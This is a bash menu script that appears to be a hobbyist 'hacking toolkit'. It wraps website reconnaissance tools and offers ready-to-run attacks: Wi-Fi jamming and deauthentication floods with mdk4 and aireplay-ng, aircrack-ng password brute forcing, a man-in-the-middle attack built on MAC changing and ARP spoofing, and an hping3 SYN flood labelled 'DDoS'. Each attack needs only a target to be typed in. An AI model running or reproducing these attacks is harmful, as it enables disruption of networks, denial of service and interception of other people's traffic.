RED='\033[0;31m'  
GREEN='\033[0;32m'  
YELLOW='\033[0;33m'  
BLUE='\033[0;34m'  
MAGENTA='\033[0;35m'  
CYAN='\033[0;36m'  
WHITE='\033[0;37m'  
NC='\033[0m' 
banner() { 
echo -e "$RED"
cat banner.txt 
echo -e "$CYAN"
}
banner


main() {  
    while true; do  
        figlet  === Main Menu ===  -c -f wideterm
        echo""
        echo "[1] Website Information Gathering"  
        echo "[2] Wifi Information Gathering"  
        echo "[3] Wifi Attacks"  
        echo "[4] Website Attacks"  
        echo "[5] Tool Settings"  
        echo "[6] Exit"  
        read -p "Select an option: " main_choice  

        case $main_choice in  
            1) web_info ;;  
            2) wifi_info ;; 
            3) wifi_attack ;; 
            4) web_attack ;;  
            5) tool_settings ;; 
            6) echo "Exiting..."; break ;;  
            *) echo "Invalid option. Please try again." ;;  
        esac  
    done  
}  

web_info() {  
clear
banner

    while true; do  
        figlet === Website Information Gathering === -c -f wideterm
        echo""
        echo "[1] Website IP Address Finder"  
        echo "[2] Website Port Scanner"  
        echo "[3] Website is up or down"  
        echo "[4] Website Subdomain Finder"  
        echo "[5] Website Deep Scan"  
        echo "[6] Exit"  
        read -p "Select an option: " info_choice  

        case $info_choice in  
            1) read -p "enter website url:-"  website 
            nslookup $website ;;  
            2) read -p "enter website url:-"  website
            nmap $website;;  
            3) read -p "enter website url:-"  URL
            echo "Checking if the website is up or down..." 
            
RESPONSE=$(curl --write-out "%{http_code}" --silent --output /dev/null "$URL")  

if [ "$RESPONSE" -eq 200 ]; then  
    echo "Success: $URL is reachable."  
else  
    echo "Error: $URL is not reachable. HTTP status code: $RESPONSE"  
fi   ;;  
            4)read -p "enter website url:-"  website
            echo "Finding website subdomains..." 
            amass enum -d $website ;;  
            5) 
read -p "Enter website URL: " website
echo "Running a website deep scan can take up to 10 minutes..."

run_with_timeout() {
    local cmd="$1"
    local timeout="$2"

 
    eval "$cmd" &
    pid=$!

  
    sleep "$timeout"

  
    if ps -p $pid > /dev/null; then
        echo "Time's up! Killing process: $pid"
        kill $pid
    fi

    wait $pid 2>/dev/null  
}


run_with_timeout "nikto -h $website" 120
run_with_timeout "whatweb $website" 120
run_with_timeout "dnsrecon -d $website" 120
run_with_timeout dirb https://$website/ 120

echo "Scan completed!"

            ;;  
            6) clear
            banner
            break
            
            main ;;  
            *) echo "Invalid option. Please try again." ;;  
        esac  
    done  
}  

wifi_attack() { 
clear 
banner
while true; do  
        figlet === Website Attacks === -c -f wideterm
        echo ""
        echo "[1] Moniter mode on/off"  
        echo "[2] 2.5 ghz Wifi Jammer  "
        echo "[3] 2.5/5ghz Wifi Jammer"  
        echo "[4] Wifi Brureforce" 
        echo "[5] Man in the Middle Attack"
        echo "[6] Wifi Deauthentication Attack" 
        echo "[7] exit"
        read -p "Select an option: " attack_choice  

        case $attack_choice in  
            1) read -p "wifi Interface: " INTERFACE



MODE=$(iw dev $INTERFACE info | grep type | awk '{print $2}')


if [ "$MODE" == "monitor" ]; then
    echo "Monitor mode is enabled on $INTERFACE. Disabling it..."
   
    airmon-ng stop $INTERFACE
    echo "Monitor mode disabled on $INTERFACE."
else
    echo "Monitor mode is not enabled on $INTERFACE. Enabling it..."
  
    airmon-ng check kill
    airmon-ng start $INTERFACE
    echo "Monitor mode enabled on $INTERFACE."
fi
 ;;  
            2) read -p "wifi Interface: " INTERFACE
            mdk4 $INTERFACE d
            ;;  
            
            3) read -p "wifi Interface: " INTERFACE
            read -p "wifi Name: " Wifi 
            mdk4 $INTERFACE d -E $Wifi
            ;;
            
             4) read -p "Wordlist: " list
            read -p "wifi BSSID: " Wifi 
            read -p "wifi handshake capture file: " file
            sudo aircrack-ng -w $list -b $Wifi $file
            ;;
            5) read -p "Attacker Mac: " ATTACKER_MAC
            read -p "Target Mac: " TARGET_MAC
            read -p "Gateway Mac" GATEWAY_MAC
read -p "wifi Interface: " INTERFACE
      

INTERFACE="eth0"


echo "Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1


echo "Bringing down the network interface..."
ifconfig $INTERFACE down


echo "Changing the MAC address of the attacker's interface..."
ifconfig $INTERFACE hw ether $TARGET_MAC


echo "Bringing up the network interface..."
ifconfig $INTERFACE up


echo "ARP spoofing the target device..."
arpspoof -i $INTERFACE -t $TARGET_MAC -r $GATEWAY_MAC


echo "ARP spoofing the gateway..."
arpspoof -i $INTERFACE -t $GATEWAY_MAC -r $TARGET_MAC


echo "Starting the MITM attack..."
echo "All traffic between $TARGET_MAC and $GATEWAY_MAC will be forwarded through $ATTACKER_MAC"


arpspoof -i $INTERFACE -t $TARGET_MAC -r $GATEWAY_MAC &
arpspoof -i $INTERFACE -t $GATEWAY_MAC -r $TARGET_MAC &


echo "Press Ctrl+C to stop the attack..."
wait
            ;;
            6)  read -p "Wifi Interface: " Inter
 read -p "Wifi BSSID: " bssid

  read -p "Count " count
            aireplay-ng --deauth $count -a $bssid  $Inter ;;
             7) clear
            banner
            break
            
            main;;  
            *) echo "Invalid option. Please try again." ;;  
        esac  
    done  
}  

 
wifi_info() {  
  clear 
banner
while true; do  
        figlet === Website Attacks === -c -f wideterm
        echo ""
        echo "[1] Network Scanner 2.5ghz "  
        echo "[2] Network Scanner 2.5ghz/5ghz"
         echo "[3] Wifi Handshake capturer"
         echo "[4] exit"
         
        read -p "Select an option: " attack_choice  

        case $attack_choice in  
            1) read -p "Wifi Interface: " Inter
airodump-ng $Inter
 ;;  
   2) read -p "Wifi Interface: " Inter
airodump-ng --band a $Inter
 ;;  
 3) echo "do  Deauthentication Attack on Another Tab" 
 read -p "Wifi Interface: " Inter
 read -p "Wifi BSSID: " bssid
 read -p "Wifi Channel: " channel
  read -p "Output File Name: " output
airodump-ng  -c $channel --bssid $bssid -w handshake/$output $Inter
echo "$Inter"
 ;;  
 
            4) clear
            banner
            break
            
            main;;  
            *) echo "Invalid option. Please try again." ;;  
        esac  
    done  
}  

web_attack() {  
    clear 
banner
while true; do  
        figlet === Website Attacks === -c -f wideterm
        echo ""
        echo "[1] DDoS"  
        echo "[2] Exit"  
        read -p "Select an option: " attack_choice  

        case $attack_choice in  
            1) read -p "Target Domain or Ip: " DOMAIN
read -p "How Many bytes of data: " DATA
read -p "enter port number: " PORT
echo "starting attacks"
hping3 $DOMAIN -c 1000 -d $DATA -S -w 64 -p $PORT --flood --rand-source
 ;;  
            2) clear
            banner
            break
            
            main;;  
            *) echo "Invalid option. Please try again." 
             clear
            banner
            break
            
            main ;;
        esac  
    done  
}  

tool_settings() {  
   clear 
banner
while true; do  
        figlet === Website Attacks === -c -f wideterm
        echo ""
        echo "[1] Update Tool"  
        echo "[2] Reinstall" 
        echo "[3] exit"
        read -p "Select an option: " attack_choice  

        case $attack_choice in  
            1) echo "update started..."
            cd
            rm -rf Project-X
            echo "files deleted"
            echo "installing Tool......"
            git clone https://github.com/mmrehu/Project-X
 ;;  
 2) echo "reinstalling........"
            chmod +x *
            ./remove.sh
            echo "Removed"
            echo "installing......"
            ./install.sh
            ;;  
 
 
            3) clear
            banner
            break
            
            main;;  
            *) echo "Invalid option. Please try again." ;;  
        esac  
    done   
}  

 
main  
